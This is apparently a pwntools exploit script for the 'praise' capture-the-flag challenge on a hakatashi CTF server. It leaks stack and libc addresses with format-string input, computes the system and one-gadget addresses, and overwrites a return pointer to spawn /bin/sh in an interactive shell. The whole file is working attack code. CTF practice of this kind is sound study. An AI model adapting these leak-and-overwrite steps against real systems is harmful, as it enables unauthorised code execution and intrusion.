#!/usr/bin/env python
#encoding: utf-8;

import readline
from pwn import *
import sys

FILENAME = "./praise"
LIBCNAME = "./libc.so.6"

hosts = ("challenge.ctf.hakatashi.com","localhost","localhost")
ports = (38888,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  global c
  pass

## exploit ###########################################

def exploit():
  global c

  c.readuntil("> ")
  c.send("%p" * 8)

  c.readuntil("> ")
  c.sendline("2")

  c.readuntil("> ")
  c.send("B" * 0x30)

  c.readuntil("> ")
  c.sendline("2")
  #c.sendline("C" * 0x30 + p8(0x85))
  c.sendline("C" * 0x30 + p8(0xd0))

  c.readuntil("C"*0x30)
  main = u64(c.recv(6) + "\x00\x00") & 0x0000FFFFFFFFFFFF

  print("[+] main: " + hex(main))

  vals = []
  for i in range(3):
    c.recvuntil("0x")
  leak = int("0x" + c.recvuntil("0x")[:-2], 16)
  printf = leak - 0x96c77
  _system = printf - 0xdff0
  base = _system - 0x0000000000048790
  execve = 0xca290 + base
  print("[+] leak: " + hex(leak))
  print("[+] printf: " + hex(printf))
  print("[+] _system: " + hex(_system))
  print("[+] base: " + hex(base))

  og1 = base + 0xca9c1
  og2 = base + 0xca9c4
  og3 = base + 0xca9c7


  _main = main - (0xd0 - 0x80)
  jmp = _main - 0x13 + 0x18 + 42 + 10
  c.sendline("")
  c.recvuntil("> ")
  c.sendline("0")
  c.recvuntil("> ")
  c.send("Y" * 0x30)
  c.recvuntil("> ")
  c.sendline("2")
  print("jmp: " + hex(jmp))
  c.send("Z" * 0x30 + p64(jmp)[0:6])

  c.recvuntil("> ")
  c.sendline("/bin/sh\x00")
  c.recvuntil("> ")
  c.sendline("0")
  c.send("Y" * 0x30)
  c.recvuntil("> ")
  c.sendline("2")
  raw_input("wait")
  c.send(p64(_system) * (0x38 / 8))

  c.interactive()


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
        #s = ssh('<USER>', '<HOST>', password='<PASSOWRD>')
        #c = s.process(executable='<BIN>')
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
